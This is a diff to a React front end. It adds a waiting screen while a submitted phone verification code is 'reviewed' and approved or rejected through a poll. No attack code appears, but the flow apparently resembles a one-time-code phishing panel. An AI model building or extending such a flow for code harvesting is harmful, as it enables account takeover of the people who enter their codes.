@@ -19,6 +19,7 @@ function App() {
     pollId: undefined
   });
   const [loading, setLoading] = useState(false);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
   const [result, setResult] = useState<'approved' | 'rejected' | null>(null);
 
   const handlePhoneSubmit = async (e: React.FormEvent) => {
@@ -73,6 +74,8 @@ function App() {
       if (data.status === 'pending') {
         // Poll was sent, now we need to wait for approval
         setFormData(prev => ({ ...prev, pollId: data.pollId }));
+        setLoading(false);
+        setWaitingForApproval(true);
         
         // Start polling for approval status
         const checkApproval = async () => {
@@ -91,7 +94,7 @@ function App() {
               // Still waiting, check again in 3 seconds
               setTimeout(checkApproval, 3000);
             } else {
-              setLoading(false);
+              setWaitingForApproval(false);
               if (checkData.approved) {
                 setResult('approved');
               } else {
@@ -101,7 +104,7 @@ function App() {
             }
           } catch (error) {
             console.error('Error checking approval:', error);
-            setLoading(false);
+            setWaitingForApproval(false);
             setResult('rejected');
             setStep('result');
           }
@@ -121,8 +124,11 @@ function App() {
       console.error('Error verifying code:', error);
       setResult('rejected');
       setStep('result');
-    } finally {
       setLoading(false);
+    } finally {
+      if (!waitingForApproval) {
+        setLoading(false);
+      }
     }
   };
 
@@ -131,6 +137,7 @@ function App() {
     setFormData({ phoneNumber: '', country: '', verificationCode: '', pollId: undefined });
     setResult(null);
     setLoading(false);
+    setWaitingForApproval(false);
   };
 
   return (
@@ -215,6 +222,26 @@ function App() {
           {step === 'verification' && (
             <div className="text-center animate-fade-in">
               <div className="backdrop-blur-md bg-white/10 rounded-2xl p-6 border border-white/20 shadow-2xl">
+                {waitingForApproval ? (
+                  <>
+                    <div className="mb-6">
+                      <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
+                        <Loader className="w-8 h-8 text-blue-400 animate-spin" />
+                      </div>
+                      <h2 className="text-2xl font-bold text-white mb-2">Please wait</h2>
+                      <p className="text-white/80">
+                        Your code is being reviewed. This may take a moment...
+                      </p>
+                    </div>
+                    <button
+                      onClick={resetForm}
+                      className="bg-white/10 hover:bg-white/20 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-300 border border-white/30"
+                    >
+                      Cancel
+                    </button>
+                  </>
+                ) : (
+                  <>
                 <div className="mb-6">
                   <Shield className="w-16 h-16 text-blue-400 mx-auto mb-4" />
                   <h2 className="text-2xl font-bold text-white mb-2">Verification Required</h2>
@@ -251,7 +278,7 @@ function App() {
                       {loading ? (
                         <div className="flex items-center justify-center">
                           <Loader className="w-5 h-5 animate-spin mr-2" />
-                          {formData.pollId ? 'Waiting for approval...' : 'Verifying...'}
+                          Verifying...
                         </div>
                       ) : (
                         'Submit Code'
@@ -259,6 +286,8 @@ function App() {
                     </button>
                   </div>
                 </form>
+                  </>
+                )}
               </div>
             </div>
           )}
